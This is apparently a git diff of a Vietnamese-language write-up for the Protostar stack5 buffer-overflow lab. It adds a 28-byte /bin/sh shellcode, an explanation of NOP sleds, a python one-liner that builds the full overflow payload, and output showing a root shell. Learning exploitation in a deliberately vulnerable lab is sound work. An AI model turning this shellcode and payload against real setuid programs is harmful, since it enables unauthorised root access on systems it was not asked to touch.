@@ -56,20 +56,67 @@ Bộ nhớ sau khi gọi hàm `gets` sẽ như sau. Phân biệt bằng màu: <s
 0xbffff790:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
 0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      <span style="color:orangered">0xbffff780</span>
 </pre>
-Sau khi được nạp giá trị mới, <span style="color:orangered">địa chỉ</span> và <span style="color:yellow">lệnh</span> sau sẽ được thực thi:
+Sau khi được nạp giá trị mới, <span style="color:orangered">địa chỉ</span> và <span style="color:yellow">lệnh</span> sau sẽ được thực thi ngay khi stack5 return.
 <pre class="memory">
 0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
-<span style="color:aqua">0xbffff760</span>:     0x<span style="color:yellow">cc</span>cccccc      0xcccccccc      0xcccccccc      0xcccccccc
+<span style="color:orangered">0xbffff760</span>:     0x<span style="color:yellow">cc</span>cccccc      0xcccccccc      0xcccccccc      0xcccccccc
 0xbffff770:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
 0xbffff780:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
 0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
 0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      0xbffff780
 
-<span style="color:aqua">0xbffff760</span>:     <span style="color:yellow">int3</span>
+<span style="color:orangered">0xbffff760</span>:     <span style="color:yellow">int3</span>
+</pre>
+```bash
+user@protostar:~$ stack5 < input.txt
+Trace/breakpoint trap
+```
+
+Với 64 byte của `buffer`, chúng ta cần tìm hoặc viết chương trình có kích cỡ trong phạm vi này.
+Các chương trình mẫu này có thể được tìm thấy trên internet với từ khóa shellcode.
+Bản chất của các shellcode chính là mã máy, mà nếu disassemble ta sẽ được asm code tương tự như asm code của stack5.
+Sau đây là đoạn shellcode dài 28 byte dùng để chạy chương trình /bin/dash trong linux:
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+```
+Lưu ý, đoạn chương trình này cần được chạy chính xác từ đầu đến cuối.
+Nếu biết chính xác vị trí trên bộ nhớ lưu shellcode này, ta sẽ gán địa chỉ đó cho `eip` của caller.
+Một kỹ thuật khác cho phép chọn địa chỉ `eip` một cách linh hoạt hơn là dùng chuỗi `nop` (có opcode `0x90`).
+Đây là một trong số ít lệnh có thể dùng mà không sợ shellcode không bị lỗi hoặc không thể chạm đến.
+Kỹ thuật này có tên là NOP-sled với nguyên lý là sử dụng chuỗi `nop` phía trước shellcode chính, sau đó ghi đè `eip` bằng 1 địa chỉ chứa `nop`.
+Khi CPU chạy lênh `nop`, nó sẽ chỉ đơn giản là bỏ qua và chuyển tới lệnh kế tiếp. Việc này sẽ tiếp diễn cho đến CPU chạm tới shellcode.
+Nếu không dùng `nop` và địa chỉ mới của `eip` cũng không chạm được tới shellcode, chương trình sẽ báo Illegal instruction và kết thúc.
+
+Với ví dụ trên, ta có 36 byte `nop`, theo sau là 28 byte shellcode. Cụ thể như sau:
+```bash
+python -c "print '\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x80\xf7\xff\xbf' * 4" > input.txt
+(cat input.txt ; cat) | stack5
+```
+<pre class="memory">
+0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
+0xbffff760:     0xb7fd7ff4      0x0804958c      0xbffff778      0x080482c4
+0xbffff770:     0xb7ff1040      0x0804958c      0xbffff7a8      0x08048409
+0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x080483f0      0xbffff7a8
+0xbffff790:     0xb7ec6365      0xb7ff1040      0x080483fb      0xb7fd7ff4
+0xbffff7a0:     0x080483f0      0x00000000      0xbffff828      0xb7eadc76
+</pre>
+
+<pre class="memory">
+0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
+0xbffff760:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff770:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff780:     0x90909090      0x6850c031      0x68732f2f      0x69622f68
+0xbffff790:     0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0
+0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      0xbffff780
 </pre>
 ## Ref
 ```bash
-user@protostar:~$ export GREENIE=$'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\x0a\x0d\x0a\x0d'
-user@protostar:~$ stack2
-you have correctly modified the variable
+user@protostar:~$ python -c "print '\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x80\xf7\xff\xbf' * 4" > input.txt
+user@protostar:~$ (cat input.txt ; cat) | stack5
+whoami
+root
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+exit
+
 ```
